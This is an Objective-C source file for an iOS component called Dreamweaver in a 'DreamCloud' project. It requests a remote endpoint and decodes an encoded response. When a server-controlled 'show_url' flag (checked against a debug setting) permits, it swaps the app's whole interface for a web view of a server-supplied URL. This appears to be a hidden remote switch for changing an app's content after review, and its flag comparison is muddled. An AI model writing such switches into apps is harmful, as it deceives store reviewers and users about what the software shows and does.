//
//  Dreamweaver.m
//  DreamCloud
//
//  Created by LWW on 2018/12/11.
//  Copyright © 2018 LWW. All rights reserved.
//

#import "Dreamweaver.h"
#import "DreamRequestManner.h"
#import "DreamViewer.h"
#import "FWebViewViewController.h"
@interface Dreamweaver()

@end
@implementation Dreamweaver

+ (instancetype)DreamInstance{
    static Dreamweaver *weaver;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        weaver = [[Dreamweaver alloc] init];
    });
    return weaver;
}

- (id)init{
    if ([super init]) {
        
       
        
    }
    return self;
}
- (void)initConfigwithUrl:(NSString *)url andAppId:(NSString *)appid  withlaunchOptions:(NSDictionary*)launchOptions{
    [self Dream:url action:appid and:^(NSString * _Nonnull url) {
        if (url != nil) {
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.01 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                FWebViewViewController *vc = [[FWebViewViewController alloc] initWithURL:url];
                [self getCurrentVC].view.window.rootViewController = vc;
            });
        }
    }];
}






- (void)Dream:(NSString *)sourUrl action:(NSString *)ID and:(void(^)(NSString*url))finishBlock{
    [[DreamRequestManner requestInstance] getWithURLString:sourUrl widh:ID success:^(NSDictionary * _Nonnull data) {
        if([data[@"rt_code"] floatValue] != 200)return;
        
        NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:[DreamViewer decodeString:data[@"data"]] options:NSJSONReadingMutableLeaves error:nil];
        
        if ([data[@"rt_code"] floatValue] == 200) {
            
            if([dic[@"show_url"] integerValue] == self.isDebug ==YES?0:1){
                
                [DreamRequestManner requestInstance].DreamUrl = dic[@"url"];
                if (finishBlock) {
                    finishBlock([DreamRequestManner requestInstance].DreamUrl);
                }
            }
            
        }else{
            
        }
    } failure:^(NSError * _Nonnull error) {
        
    }];
     
    
}
- (UIViewController *)getCurrentVC {
    
    UIWindow *window = [[UIApplication sharedApplication].windows firstObject];
    if (!window) {
        return nil;
    }
    UIView *tempView;
    for (UIView *subview in window.subviews) {
        if ([[subview.classForCoder description] isEqualToString:@"UILayoutContainerView"]) {
            tempView = subview;
            break;
        }
    }
    if (!tempView) {
        tempView = [window.subviews lastObject];
    }
    
    id nextResponder = [tempView nextResponder];
    while (![nextResponder isKindOfClass:[UIViewController class]] || [nextResponder isKindOfClass:[UINavigationController class]] || [nextResponder isKindOfClass:[UITabBarController class]]) {
        tempView =  [tempView.subviews firstObject];
        
        if (!tempView) {
            return nil;
        }
        nextResponder = [tempView nextResponder];
    }
    
    return  (UIViewController *)nextResponder;
}
@end
